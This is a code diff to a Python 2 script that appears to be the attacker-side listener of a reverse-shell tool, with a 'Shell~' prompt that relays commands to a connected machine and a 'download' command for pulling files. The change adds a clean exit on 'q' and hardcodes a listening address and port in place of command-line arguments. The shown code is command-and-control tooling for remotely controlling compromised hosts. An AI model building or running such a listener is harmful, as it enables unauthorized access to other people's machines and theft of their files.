@@ -4,6 +4,7 @@ import socket
 import base64
 import json
 import sys
+import time
 
 
 def reliable_send(data):
@@ -26,7 +27,8 @@ def shell():
         command = raw_input("Shell~%s: " % str(ip[0]))
         reliable_send(command)
         if command == 'q':
-            break
+            time.sleep(2)
+            sys.exit()
         elif command[:2] == "cd" and len(command) > 1:
             continue
         elif command[:8] == "download":
@@ -71,8 +73,10 @@ def server():
     print("[+] Connection Established From: %s" % str(ip))
 
 
-ip = sys.argv[1]
-port = sys.argv[2]
+# ip = sys.argv[1]
+# port = sys.argv[2]
+ip = "192.168.0.178"
+port = 54321
 count = 1
 
 server()
